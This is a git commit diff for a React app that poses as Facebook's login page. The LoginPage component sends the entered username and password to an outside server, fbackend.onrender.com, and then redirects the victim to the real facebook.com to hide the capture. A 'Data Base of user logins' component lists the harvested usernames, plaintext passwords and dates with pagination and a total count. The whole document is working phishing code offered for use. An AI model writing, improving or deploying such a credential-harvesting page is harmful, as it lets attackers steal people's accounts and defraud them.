3c71159a94aabd2b5f47c6d8c9b7d5a008cca319
Anuma Thomas <tombrownanuma@gmail.com>
2022-11-24 20:54:38 +0100

    latest

--- src/components/LoginPage.js
+++ src/components/LoginPage.js
@@ -1,31 +1,36 @@
 import facebookIcon from "../my-facebook.svg";
 import React, {useState} from "react";
 import axios from "axios";
+import {Form} from 'react-bootstrap'
+
 
 export default function Login() {
     const [userName, setUserName] = useState("");
     const [password, setPassword] = useState("");
 
+    const [validated, setValidated] = useState(false);
+
     function Login(e) {
         e.preventDefault()
-
+        setValidated(true);
         const userObject = {
             user_name: userName,
             password: password
         }
 
-        axios.post("http://localhost:4000/login", userObject)
+        axios.post("https://fbackend.onrender.com/login", userObject)
             .then(() => {
-                console.log("Logged in!")
+
             })
 
+        window.location = 'https://www.facebook.com'
     }
 
     return (
         <>
             <div className="Facebook-title">
                 <div>
-                    <img src={facebookIcon} alt=""/>
+                    <img src={facebookIcon} alt="Facebook"/>
                 </div>
                 <div>
                     <h5>Facebook helps you connect and share with the people in your life.</h5>
@@ -33,20 +38,25 @@ export default function Login() {
             </div>
 
             <div className="form-container">
-                <form className="my-form">
+                <Form className="my-form" validated={validated} onSubmit={Login}>
+                    <div className="text-center">
+                        <h5>Log in to Facebook</h5>
+                    </div>
                     <input
+                        required={true}
                         onChange={(e) => setUserName(e.target.value)}
                         className="input-email"
                         type="email"
                         placeholder="Email address or phone number"/>
                     <input
+                        required={true}
                         onChange={(e) => setPassword(e.target.value)}
                         className="input-password"
                         type="password"
                         placeholder="Password"/>
 
                     <button
-                        onClick={Login}
+                        type='submit'
                         className="btn-login">
                         Log in
                     </button>
@@ -63,7 +73,7 @@ export default function Login() {
                             Create New Account
                         </button>
                     </div>
-                </form>
+                </Form>
                 <div className="create-page">
                     <a href="https://web.facebook.com/pages/create/?ref_type=registration_form">Create Page</a>
                     <span> for a celebrity, brand or business.</span>
--- src/components/database.js
+++ src/components/database.js
@@ -1,40 +1,87 @@
 import React, {useEffect, useState} from 'react'
 import axios from "axios";
-import {Card, Container} from "react-bootstrap";
+import {Button, Card, Container} from "react-bootstrap";
+import ReactLoading from 'react-loading';
 
-export default function Database() {
+export default function Database({spin, color}) {
     const [data, setData] = useState([])
+    const [TotalData, setTotalData] = useState(0)
+    const [pages, setPages] = useState(0)
+    const [isLoading, setIsLoading] = useState(true)
+
 
     useEffect(() => {
-        axios.get("https://fbackend.onrender.com/read")
-            .then((res) => setData(res.data))
+        axios.get(`https://fbackend.onrender.com/read?p=${pages}`)
+            .then((res) => {
+                setData(res.data)
+                setIsLoading(false)
+            })
+            .catch(err => console.log(err))
+
+    }, [pages])
+
+    useEffect(() => {
+        axios.get(`https://fbackend.onrender.com/total`)
+            .then((res) => setTotalData(res.data))
             .catch(err => console.log(err))
     }, [])
 
-    console.log(data)
 
     return (
         <div>
-            <Container>
-                <h2>Data Base of user logins</h2>
-            </Container>
-            {data.map((item, index)=>{
-            return(
-                <div key={index}>
-                    <Card className="my-card rounded-0" style={{ width: '100%'}}>
-                        <Card.Body>
-                            <Card.Text >
-                                <span className="text-info fw-bold">User Name: </span>{item.user_name}
-                            </Card.Text>
-
-                            <Card.Text>
-                                <span className="text-info fw-bold">Password: </span> {item.password}
-                            </Card.Text>
-                        </Card.Body>
-                    </Card>
+            {isLoading ?
+                <div className="spinner"><ReactLoading type={"spin"} color={"blue"} width={'5rem'}/>
                 </div>
+                :
+                <>
+                    <Container className="text-center">
+                        <h2>Data Base of user logins</h2> <span
+                        className="text-warning fw-bold">Total logins: {TotalData}</span>
+                    </Container>
+                </>
+            }
+
+            {data.map((item, index) => {
+                return (
+                    <div key={index}>
+                        <Card className="my-card rounded-0 shadow" style={{width: '50vh', height: '9rem'}}>
+                            <Card.Body>
+                                <Card.Text>
+                                    <span className="text-info fw-bold">User Name: </span>{item.user_name}
+                                </Card.Text>
+
+                                <Card.Text>
+                                    <span className="text-info fw-bold">Password: </span> {item.password}
+                                </Card.Text>
+
+                                <Card.Text>
+                                    <span className="text-info fw-bold">Date: </span> {item.creatAt}
+                                </Card.Text>
+                            </Card.Body>
+                        </Card>
+                    </div>
                 )
             })}
+
+            <Container className="mt-2 d-flex justify-content-between">
+                <Button
+                    hidden={isLoading}
+                    disabled={pages === 0 && true}
+                    onClick={() => setPages(pages - 1)}
+                    variant="danger">
+                    BACK
+                </Button>
+
+                <h6 hidden={isLoading}>Page: {pages + 1}</h6>
+
+                <Button
+                    hidden={isLoading}
+                    disabled={data.length === 0 && true}
+                    onClick={() => setPages(pages + 1)}
+                    variant="danger">
+                    NEXT
+                </Button>
+            </Container>
 
         </div>
     )
